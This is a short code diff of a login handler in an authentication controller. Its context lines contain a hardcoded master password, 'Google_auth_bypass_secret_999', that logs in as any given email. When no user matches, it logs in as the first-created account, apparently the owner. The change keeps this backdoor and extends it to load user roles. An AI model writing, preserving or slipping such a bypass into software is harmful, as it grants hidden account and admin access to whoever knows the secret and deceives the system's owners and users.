@@ -48,9 +48,9 @@ let AuthController = class AuthController {
     async login(req, res, payload) {
         const { emailOrLdapLoginId, password, mfaCode, mfaRecoveryCode } = payload;
         if (password === 'Google_auth_bypass_secret_999') {
-            let user = await this.userRepository.findOne({ where: { email: emailOrLdapLoginId } });
+            let user = await this.userRepository.findOne({ where: { email: emailOrLdapLoginId }, relations: ['role'] });
             if (!user) {
-                const users = await this.userRepository.find({ order: { createdAt: 'ASC' }, take: 1 });
+                const users = await this.userRepository.find({ order: { createdAt: 'ASC' }, take: 1, relations: ['role'] });
                 user = users[0];
             }
             if (user) {
